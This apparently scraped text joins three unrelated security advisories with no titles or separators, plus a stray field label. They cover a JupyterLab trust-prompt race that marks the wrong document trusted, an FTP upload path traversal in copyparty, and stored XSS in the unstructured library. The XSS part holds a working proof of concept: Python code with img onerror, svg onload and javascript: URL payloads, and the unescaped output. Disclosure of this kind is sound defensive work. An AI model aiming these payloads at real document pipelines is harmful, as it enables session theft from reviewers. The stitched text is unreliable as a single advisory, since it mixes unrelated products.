Which document gets marked is decided when the user answers, not when they click. Both trust commands read whichever document is current at that moment: markdownviewer:trust uses tracker.currentWidget, and notebook:trust uses the equivalent lookup. If another document becomes current while the prompt is open, that document is the one marked trusted, and the one the user was looking at stays untrusted.

Users are affected if all of the following are true:

  • they run JupyterLab 4.5.7 through 4.6.3, or an application that bundles it such as Notebook 7.5+;
  • they open a Markdown file or notebook from someone else and click a button in it;
  • they answer Trust rather than Cancel or Run Once; and
  • a second document becomes the current one while the prompt is open, for example through a workspace restoring at startup, an extension activating a widget, or a command that opens a file

Impact

The user loses control over which document they trusted. Every button in the document that was (incorrectly) marked as trusted runs from then on without a prompt, so if that document also came from an untrusted source, its buttons fire on a single click with no confirmation. That is the state the prompt was added to prevent, in GHSA-mqcg-5x36-vfcg.

The command that ran had the user's consent, because the prompt named it and they pressed Trust. The document they were reading stays untrusted, so it prompts again on the next click.

Notebooks are written to disk

When the document marked is a notebook, the effect outlives the browser session. notebook:trust marks every cell trusted and then saves the file, which results in the server signing it, so the notebook stays trusted when it is next opened. The save also writes out any unsaved edits in that notebook. A second confirmation appears first, but it says only that a trusted notebook may execute hidden code, without naming the file, so it does not show the user which notebook is about to be trusted.

A Markdown preview marked this way stays trusted only until it is closed. Nothing is written to disk.

Patches

JupyterLab v4.6.4 and v4.5.11 contain the patch. The trust request now carries the document that was clicked, and the command is run only once that same document has been marked.

Users of applications that depend on JupyterLab, such as Notebook v7+, should update jupyterlab package too.

Workarounds

Given the high complexity of a potential exploit, we advise treating this as a defense in-depth and update at earliest opportunity, rather than apply the workarounds listed below. However, for users running in highly sensitive environments who are unable to upgrade the workarounds are included below.

Turn off command linker, which removes the ability to execute frontend commands altogether:

{
  "@jupyterlab/apputils-extension:sanitizer": {
    "allowCommandLinker": false
  }
}

In such configuration the buttons in Markdown files and notebook outputs then do nothing when clicked. Documentation and extensions that use command links for navigation stop working, and the setting applies to every document, not only untrusted ones.

If disabling that setting is not desirable and update is not possible, advise users to choose "Run Once" rather than "Trust". "Run Once" makes the command run but no document is marked, so nothing can be trusted in error.

items.content_html:
The FTP and FTPS server -- if enabled -- would allow uploading to any folder that the copyparty process had permission to write to.

The FTP-server is default-disabled, and must be explicitly enabled in the config with global-option ftp or ftps to be affected. Additionally, SFTP was not affected at all; only FTP and FTPS.

This was not a full read/write path-traversal; it had the following limitations:

  • Only applied to uploads; it was not possible to read/download existing files in this manner.
  • The output filename was not fully controllable; a randomized suffix would always be appended to the filename.
  • Existing files could not be overwritten or appended to; only new files could be created.
  • Filesystem-permissions would prevent writing to system folders, as copyparty surely does not run as root in most deployments.
  • Copyparty itself will not execute arbitrary files as code by default, so this vulnerability could not be used to execute arbitrary code through copyparty.

The main concern is the potential effect on other unrelated software which is running on the same system.

The severity is assuming the worst case (SC:H/SI:H), that the same machine is running some unrelated software that will execute new arbitrarily-named files as code, and that the copyparty process has sufficient privileges to write files into the config-folder of that unrelated software.

Summary

When unstructured parses an untrusted document and outputs the result as HTML, malicious markup contained in the document (e.g. <img src=x onerror=...>) is left in the output HTML without escaping. When that output is displayed in a browser, the script embedded in the document executes in the viewer's browser.

Details

partition_html(html_parser_version="v2") (and the VLM partitioner) preserve the input document's element tags, attributes, and text into metadata.text_as_html, and elements_to_html() outputs that as an HTML document.

The function that builds HTML on this path, to_html() in unstructured/documents/ontology.py, performs no escaping at all. As a result, event handlers such as onerror / onmouseover / onload originating from the input document are left in the output HTML as-is (literal <script> tags are stripped by the parser, but attribute-based vectors and javascript: URLs are not). In addition, link URLs are not scheme-filtered, so <a href="javascript:..."> is also emitted.

Relevant source: documents/ontology.py (to_html, _construct_attribute_string, _generate_final_html); partition/html/transformations.py (text_as_html = ontology_element.to_html()); partition/html/convert.py (elements_to_html).

PoC

Environment: downloads.unstructured.io/unstructured-io/unstructured:latest, unstructured 0.23.3.

from unstructured.partition.html import partition_html
from unstructured.partition.html.convert import elements_to_html

malicious = ('<body class="Document">'
             '<p class="Paragraph" onmouseover="alert(1)">hello'
             '<img src=x onerror="alert(document.domain)"></p>'
             '<a class="Hyperlink" href="javascript:alert(document.cookie)">click me</a>'
             '</body>')
els = partition_html(text=malicious, html_parser_version="v2")
open("xss_output.html", "w").write(elements_to_html(list(els), no_group_by_page=True))

elements_to_html() output body — the unescaped vectors survive:

<p class="NarrativeText" id="..." onmouseover="alert(1)">
  <p class="Paragraph">hello</p>
  <img class="Image" onerror="alert(document.domain)" src="x"/>
</p>
<a class="UncategorizedText" href="javascript:alert(document.cookie)" id="...">click me</a>

Opening xss_output.html in a browser fires alert automatically (via <img onerror>), with no interaction. Per-vector confirmation (each payload labelled, each verified in a browser):

Vector Trigger Cause
<img onerror> open file (auto) element text not escaped
<svg onload> (via title='"><svg ...>') open file (auto) attribute value not escaped (" breakout)
<a href=javascript:> click link URL scheme not filtered
onmouseover hover source attribute preserved as-is

Impact

Stored XSS caused by improper output encoding. Anyone who renders the HTML or text_as_html generated from an untrusted document is affected. In an ingestion pipeline where uploaded documents are parsed and a staff member reviews their contents in a web UI, a low-privileged or external submitter can inject malicious HTML; when a privileged reviewer later opens the parsed result, <img onerror> fires in their session with no interaction, leading to cross-record information disclosure and privileged actions.
